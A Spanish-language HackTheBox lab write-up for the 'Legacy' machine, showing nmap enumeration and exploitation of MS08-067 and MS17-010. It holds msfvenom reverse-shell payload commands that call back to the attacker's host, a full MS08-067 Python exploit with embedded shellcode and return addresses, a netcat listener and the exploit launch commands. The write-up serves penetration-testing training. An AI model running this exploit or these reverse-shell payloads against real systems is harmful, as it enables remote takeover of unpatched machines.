---
title: 'Legacy Write Up [OSCP-Style]'
disqus: HackTheBox 
---

Legacy WRITE UP [OSCP-Style]
===

Hecho por @xlcc4096 y @CapitanJ4ck21 

## Indice 

[TOC]

> Legacy es una máquina windows de Hackthebox la cual despues de una enumeración básica con `nmap` llegamos a la conclusión que es vulnerable a `ms17-010` y a `ms68-067`, a través de su explotación conseguimos shell en la maquina como administrador.

## Enumeración
### Escaneo de puertos
Lo primero que hacemos como siempre enumerar todos los puertos TCP abiertos de la máquina y a cada puerto encontrado le lanzamos un escaneo de detección de servicios y le pasamos también a cada puerto scripts de por defecto de enumeración de nmap:




```bash=
nmap -Pn -n -vvv -p- -sS --min-rate 5000 -A -oN targeted 10.10.10.4
```
```
# Nmap 7.80 scan initiated Mon Dec  7 10:11:35 2020 as: nmap -Pn -n -vvv -p- -sS --min-rate 5000 -A -oN targeted 10.10.10.4
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.30s latency).
Scanned at 2020-12-07 10:11:35 GMT for 93s
Not shown: 65532 filtered ports
Reason: 65532 no-responses
PORT     STATE  SERVICE       REASON          VERSION
139/tcp  open   netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  syn-ack ttl 127 Windows XP microsoft-ds
3389/tcp closed ms-wbt-server reset ttl 127
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (92%), General Dynamics embedded (89%)
OS CPE: cpe:/o:microsoft:windows_xp cpe:/o:microsoft:windows_server_2003 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Microsoft Windows XP SP2 or Windows Small Business Server 2003 (92%), Microsoft Windows 2000 SP4 or Windows XP SP2 or SP3 (92%), Microsoft Windows XP SP2 (91%), Microsoft Windows Server 2003 (90%), Microsoft Windows XP SP3 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 or SP3 (90%), Microsoft Windows XP Professional SP2 (90%), Microsoft Windows XP SP2 or Windows Server 2003 (90%), Microsoft Windows 2000 Server (89%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.80%E=4%D=12/7%OT=139%CT=3389%CU=%PV=Y%DS=2%DC=T%G=N%TM=5FCE0034%P=x86_64-pc-linux-gnu)
SEQ(SP=101%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=0)
OPS(O1=M54DNW0NNT00NNS%O2=M54DNW0NNT00NNS%O3=M54DNW0NNT00%O4=M54DNW0NNT00NNS%O5=M54DNW0NNT00NNS%O6=M54DNNT00NNS)
WIN(W1=44E9%W2=44E9%W3=4100%W4=40E8%W5=40E8%W6=402E)
ECN(R=Y%DF=Y%TG=80%W=44E9%O=M54DNW0NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T5(R=Y%DF=N%TG=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=N%TG=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)
T7(R=N)
U1(R=N)
IE(R=Y%DFI=S%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=256 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: -3h59m37s, deviation: 1h24m50s, median: -4h59m37s
| nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:31:58 (VMware)
| Names:
|   LEGACY<00>           Flags: <unique><active>
|   HTB<00>              Flags: <group><active>
|   LEGACY<20>           Flags: <unique><active>
|   HTB<1e>              Flags: <group><active>
|   HTB<1d>              Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
| Statistics:
|   00 50 56 b9 31 58 00 00 00 00 00 00 00 00 00 00 00
|   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
|_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 40600/tcp): CLEAN (Timeout)
|   Check 2 (port 37806/tcp): CLEAN (Timeout)
|   Check 3 (port 50902/udp): CLEAN (Timeout)
|   Check 4 (port 34683/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2020-12-07T09:12:39+02:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-security-mode: Couldn't establish a SMBv2 connection.
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT       ADDRESS
1   296.32 ms 10.10.14.1
2   296.75 ms 10.10.10.4

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Dec  7 10:13:08 2020 -- 1 IP address (1 host up) scanned in 93.90 seconds

```



### Puertos 139-445 / TCP

Encontramos que los puertos 139 y 445 y teniendo en cuenta que NMAP nos devolvio que el sistema operativo del objetivo es un Windows XP entonces esto nos da a pie a pensar a que ya que es un sistema antiguo pueda que sea vulnerable a ciertas vulnerabilidades, asi que escaneamos vulnerabilidades en estos dos puertos con `nmap`.
```
nmap -p 139,445 -script=vuln -oN info/scan/vuln 10.10.10.4 -Pn              
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-07 11:09 CET
Nmap scan report for 10.10.10.4
Host is up (0.034s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Host script results:
|_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010) 
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 24.57 seconds
```
Segun la salida de `nmap` vemos que el objetivo que el objetivo es vulnerable a `ms08-067` y a `ms17-010`.

## Explotación
### CVE-2008-4250 / MS08-067 

Este cve permite a los atacantes remotos ejecutar código arbitrario por medio de una petición RPC creada que desencadena el desbordamiento durante una Canonicalización de Path. 

Generación de la shellcode. Para entender bien este processo nos hemos basado en este [post](https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86). 
`-p` indicamos el payload
`LHOST y LPORT` Indicamos nuestra ip y puerto 
> **Nota** Recomendamos utilizar el puerto 443 porque es más facil que en caso de que haya un firewall lo deje pasar. 

`EXITFUNC` Indicamos como queremos cerrar el proceso 

`-b` Indicamos los badchars. 
`-f` El formato del shellcode
`-a --platform` Indicamos arquitectura y sistema operativo
`-v` Indicamos el nombre de la variable

```bash=
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 -v shellcode --platform windows
```
Antes de lanzar el exploit es importante saber como funciona a bajo nivel la vulnerabilidad a bajo nivel, este post explica muy bien la vulnerabilidad que se va a explotar ahora https://labs.f-secure.com/assets/BlogFiles/hello-ms08-067-my-old-friend.pdf.
Una vez que nos hemos informado del funcionamiento de esta buscamos y analizamos el exploit que vamos a lanzar y lo ejecutamos.
>**Nota**: Es importante tener instalado impaket para ejecutarlo


```python=
#!/usr/bin/env python3
import struct
import time
import sys
from threading import Thread  # Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket.dcerpc.v5 import transport
# ------------------------------------------------------------------------

# Example msfvenom commands to generate shellcode:
# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.15 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 -v shellcode -s 410 --platform windows

# Reverse TCP port 443:
shellcode=(
"\x33\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81\x76\x0e"
"\x93\x27\xba\xda\x83\xee\xfc\xe2\xf4\x6f\xcf\x38\xda\x93\x27"
"\xda\x53\x76\x16\x7a\xbe\x18\x77\x8a\x51\xc1\x2b\x31\x88\x87"
"\xac\xc8\xf2\x9c\x90\xf0\xfc\xa2\xd8\x16\xe6\xf2\x5b\xb8\xf6"
"\xb3\xe6\x75\xd7\x92\xe0\x58\x28\xc1\x70\x31\x88\x83\xac\xf0"
"\xe6\x18\x6b\xab\xa2\x70\x6f\xbb\x0b\xc2\xac\xe3\xfa\x92\xf4"
"\x31\x93\x8b\xc4\x80\x93\x18\x13\x31\xdb\x45\x16\x45\x76\x52"
"\xe8\xb7\xdb\x54\x1f\x5a\xaf\x65\x24\xc7\x22\xa8\x5a\x9e\xaf"
"\x77\x7f\x31\x82\xb7\x26\x69\xbc\x18\x2b\xf1\x51\xcb\x3b\xbb"
"\x09\x18\x23\x31\xdb\x43\xae\xfe\xfe\xb7\x7c\xe1\xbb\xca\x7d"
"\xeb\x25\x73\x78\xe5\x80\x18\x35\x51\x57\xce\x4f\x89\xe8\x93"
"\x27\xd2\xad\xe0\x15\xe5\x8e\xfb\x6b\xcd\xfc\x94\xd8\x6f\x62"
"\x03\x26\xba\xda\xba\xe3\xee\x8a\xfb\x0e\x3a\xb1\x93\xd8\x6f"
"\x8a\xc3\x77\xea\x9a\xc3\x67\xea\xb2\x79\x28\x65\x3a\x6c\xf2"
"\x2d\xb0\x96\x4f\xb0\xd0\x9d\x28\xd2\xd8\x93\x26\x01\x53\x75"
"\x4d\xaa\x8c\xc4\x4f\x23\x7f\xe7\x46\x45\x0f\x16\xe7\xce\xd6"
"\x6c\x69\xb2\xaf\x7f\x4f\x4a\x6f\x31\x71\x45\x0f\xfb\x44\xd7"
"\xbe\x93\xae\x59\x8d\xc4\x70\x8b\x2c\xf9\x35\xe3\x8c\x71\xda"
"\xdc\x1d\xd7\x03\x86\xdb\x92\xaa\xfe\xfe\x83\xe1\xba\x9e\xc7"
"\x77\xec\x8c\xc5\x61\xec\x94\xc5\x71\xe9\x8c\xfb\x5e\x76\xe5"
"\x15\xd8\x6f\x53\x73\x69\xec\x9c\x6c\x17\xd2\xd2\x14\x3a\xda"
"\x25\x46\x9c\x5a\xc7\xb9\x2d\xd2\x7c\x06\x9a\x27\x25\x46\x1b"
"\xbc\xa6\x99\xa7\x41\x3a\xe6\x22\x01\x9d\x80\x55\xd5\xb0\x93"
"\x74\x45\x0f"
)

# ------------------------------------------------------------------------

# Gotta make No-Ops (NOPS) + shellcode = 410 bytes
num_nops = 410 - len(shellcode)
newshellcode = "\x90" * num_nops
newshellcode += shellcode  # Add NOPS to the front
shellcode = newshellcode   # Switcheroo with the newshellcode temp variable

#print "Shellcode length: %s\n\n" % len(shellcode)

nonxjmper = "\x08\x04\x02\x00%s" + "A" * 4 + "%s" + \
    "A" * 42 + "\x90" * 8 + "\xeb\x62" + "A" * 10
disableNXjumper = "\x08\x04\x02\x00%s%s%s" + "A" * \
    28 + "%s" + "\xeb\x02" + "\x90" * 2 + "\xeb\x62"
ropjumper = "\x00\x08\x01\x00" + "%s" + "\x10\x01\x04\x01";
module_base = 0x6f880000


def generate_rop(rvas):
    gadget1 = "\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3 = "\xcc\x90\xeb\x5a"
    ret = struct.pack('<L', 0x00018000)
    ret += struct.pack('<L', rvas['call_HeapCreate'] + module_base)
    ret += struct.pack('<L', 0x01040110)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L', 0x01010101)
    ret += struct.pack('<L',
                       rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget1
    ret += struct.pack('<L', rvas['mov [eax], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget2[0]
    ret += gadget2[1]
    ret += struct.pack('<L', rvas[
                       'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['pop ecx / ret'] + module_base)
    ret += gadget2[2]
    ret += struct.pack('<L', rvas['mov [eax+0x10], ecx / ret'] + module_base)
    ret += struct.pack('<L', rvas['add eax, 8 / ret'] + module_base)
    ret += struct.pack('<L', rvas['jmp eax'] + module_base)
    ret += gadget3
    return ret


class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()

        self.port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os == '1'):
            print('Windows XP SP0/SP1 Universal\n')
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '2'):
            print('Windows 2000 Universal\n')
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '3'):
            print('Windows 2003 SP0 Universal\n')
            ret = "\x9e\x12\x00\x01"  # 0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os == '4'):
            print('Windows 2003 SP1 English\n')
            ret_dec = "\x8c\x56\x90\x7c"  # 0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  # 0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c"  # 0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c"  # 0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (
                ret_dec * 6, ret_pop, disable_nx, jmp_esp * 2)
        elif (self.os == '5'):
            print('Windows XP SP3 French (NX)\n')
            ret = "\x07\xf8\x5b\x59"  # 0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59"  # 0x59 5c 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '6'):
            print('Windows XP SP3 English (NX)\n')
            ret = "\x07\xf8\x88\x6f"  # 0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f"  # 0x6f 89 17 c2
            # the nonxjmper also work in this case.
            jumper = nonxjmper % (disable_nx, ret)
        elif (self.os == '7'):
            print('Windows XP SP3 English (AlwaysOn NX)\n')
            rvasets = {'call_HeapCreate': 0x21286, 'add eax, ebp / mov ecx, 0x59ffffa8 / ret': 0x2e796, 'pop ecx / ret': 0x2e796 + 6,
                'mov [eax], ecx / ret': 0xd296, 'jmp eax': 0x19c6f, 'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret': 0x10a56, 'mov [eax+0x10], ecx / ret': 0x10a56 + 6, 'add eax, 8 / ret': 0x29c64}
            # the nonxjmper also work in this case.
            jumper = generate_rop(rvasets) + "AB"
        else:
            print('Not supported OS version\n')
            sys.exit(-1)

        print('[-]Initiating connection')

        # MORE MODIFICATIONS HERE #############################################################################################

        if (self.port == '445'):
            self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        else:
            # DCERPCTransportFactory doesn't call SMBTransport with necessary parameters. Calling directly here.
            # *SMBSERVER is used to force the library to query the server for its NetBIOS name and use that to 
            #   establish a NetBIOS Session.  The NetBIOS session shows as NBSS in Wireshark.

            self.__trans = transport.SMBTransport(remoteName='*SMBSERVER', remote_host='%s' % self.target, dstport = int(self.port), filename = '\\browser' )
        
        self.__trans.connect()
        print('[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(
            ('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))
        path = "\x5c\x00" + "ABCDEFGHIJ" * 10 + shellcode + "\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + \
            "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00" + jumper + "\x00" * 2
        server = "\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix = "\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        
        # NEW HOTNESS
        # The Path Length and the "Actual Count" SMB parameter have to match.  Path length in bytes
        #   is double the ActualCount field.  MaxCount also seems to match.  These fields in the SMB protocol
        #   store hex values in reverse byte order.  So: 36 01 00 00  => 00 00 01 36 => 310.  No idea why it's "doubled"
        #   from 310 to 620.  620 = 410 shellcode + extra stuff in the path.
        MaxCount = "\x36\x01\x00\x00"  # Decimal 310. => Path length of 620.
        Offset = "\x00\x00\x00\x00"
        ActualCount = "\x36\x01\x00\x00" # Decimal 310. => Path length of 620

        self.__stub = server + MaxCount + Offset + ActualCount + \
            path + "\xE8\x03\x00\x00" + prefix + "\x01\x10\x00\x00\x00\x00\x00\x00"        

        return

    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)
        time.sleep(3)
        print('Exploit finish\n')

if __name__ == '__main__':
       try:
           target = sys.argv[1]
           os = 6
           port = 445
       except IndexError:
                print('\nUsage: %s <target ip> \n' % sys.argv[0])
                print('Example: MS08_067_2018.py 10.10.10.4 ')
                print 'nmap -p 139,445 --script-args=unsafe=1 --script /usr/share/nmap/scripts/smb-os-discovery 10.10.10.4'
                sys.exit(-1)


current = SRVSVC_Exploit(target, os, port)
current.start()
```
Ponemos a la escucha el netcat en el puerto especificado a la hora de la generación de la shellcode.
```
nc -lnvp 443
listening on [any] 443 ...
```

Lanzamos el exploit una vez puesto a la escucha el netcat.
```
python3 exploits/cve/MS08-067.py 10.10.10.4 6 445
```
Una vez lanzado conseguimos shell como SYSTEM.


### CVE-2017-0144 / MS17-010
Antes de nada me puse a investigar de como funcionaba a bajo nivel esta vulnerabilidad, un post muy bueno y muy completo sobre esta es el siguiente:
https://zerosum0x0.blogspot.com/2017/04/doublepulsar-initial-smb-backdoor-ring.html
Una vez que nos informamos de como funciona esta vulnerabilidad a bajo nivel procedemos a buscar exploits compatibles y estables, encontramos el siguiente:
https://github.com/helviojunior/MS17-010/blob/master/send_and_execute.py
Antes de lanzar me lo lei para ver como funcionaba y al ver que no habia nada extraño procedi a la generacion del payload:

```bash=
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=31337 EXITFUNC=thread -f exe -a x86 --platform windows -o ms17-010.exe
```

Lo siguiente que vamos a hacer es lanzar el exploit:
```bash=
python send_and_execute.py 10.10.10.4 ms17-010.exe
```

Ponemos a la escucha el netcat y una vez lanzado ya tenemos shell como SYSTEM.
```
C:\Documents and Settings\Administrator\Desktop>type root.txt
type root.txt
993442d2...ae9e695d5713
```